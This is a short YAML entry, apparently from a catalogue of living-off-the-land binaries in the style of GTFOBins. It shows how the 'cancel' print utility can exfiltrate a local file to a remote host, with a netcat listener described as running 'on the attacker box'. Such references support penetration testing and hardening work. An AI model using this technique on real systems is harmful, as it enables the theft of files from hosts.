---
functions:
  file-upload:
    - description: Send local file using a TCP connection. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
---
